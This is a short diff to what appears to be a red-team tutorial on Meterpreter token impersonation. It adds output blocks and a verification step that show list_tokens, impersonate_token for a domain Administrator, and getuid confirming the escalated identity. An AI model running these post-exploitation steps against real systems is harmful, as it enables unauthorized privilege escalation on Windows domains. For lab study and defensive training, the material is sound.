@@ -383,6 +383,7 @@ meterpreter > list_tokens -u
 ```
 
 **Output:**
+
 ```text
 meterpreter > list_tokens -u
 
@@ -411,16 +412,26 @@ No tokens available
 impersonate_token "READTEAMBD\\Administrator"
 ```
 
+**Output:**
+
 ```text
 meterpreter > impersonate_token READTEAMBD\\Administrator
 [+] Delegation token available
 [+] Successfully impersonated user READTEAMBD\Administrator
 ```
 
+## Step 5 - Verify Access
 
+```bash
+getuid
+```
 
+**Output:**
 
-
+```text
+meterpreter > getuid
+Server username: READTEAMBD\administrator
+```
 
 
 
